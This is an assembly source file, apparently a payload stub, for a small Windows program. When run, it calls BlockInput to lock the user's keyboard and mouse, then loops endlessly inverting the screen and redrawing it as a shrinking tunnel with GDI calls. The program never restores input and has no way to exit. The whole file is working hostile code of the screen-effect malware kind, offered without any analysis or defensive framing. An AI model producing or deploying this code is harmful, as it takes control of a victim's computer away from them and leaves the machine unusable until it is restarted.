format PE GUI on 'stub.exe'
entry start
include 'include/win32a.inc'

section '.idata' import data readable writeable
    library kernel32, 'kernel32', user32, "user32", gdi32, "gdi32"

    import user32, GetDesktopWindow, 'GetDesktopWindow', GetWindowDC, "GetWindowDC", GetWindowRect, "GetWindowRect", BlockInput, "BlockInput"
    import gdi32, BitBlt, "BitBlt", StretchBlt, "StretchBlt"
    import kernel32, Sleep, "Sleep", GetTickCount, "GetTickCount"

    start:
        push    edi
        push    esi
        push    ebx
        sub     esp, 16
        call    [GetDesktopWindow]
        sub     esp, 12
        push    eax
        mov     esi, eax
        call    [GetWindowDC]
        sub     esp, 12
        mov     ebx, eax
        lea     eax, [esp+24]
        push    eax
        push    esi
        call    [GetWindowRect]
        mov     esi, DWORD [esp+32]
        mov     edi, DWORD [esp+36]
        sub     esi, DWORD [esp+24]
        sub     edi, DWORD [esp+28]
        add     esp, 12
        push    1
        call    [BlockInput]
        add     esp, 16
        l:
        sub     esp, 12
        push    3342344
        push    0
        push    0
        push    ebx
        push    edi
        push    esi
        push    0
        push    0
        push    ebx
        call    [BitBlt]
        push    eax
        push    eax
        lea     eax, [edi-100]
        push    13369376
        push    edi
        push    esi
        push    0
        push    0
        push    ebx
        push    eax
        lea     eax, [esi-100]
        push    eax
        push    50
        push    50
        push    ebx
        call    [StretchBlt]
        pop     edx
        pop     ecx
        push    100
        call    [Sleep]
        add     esp, 12
        jmp     l
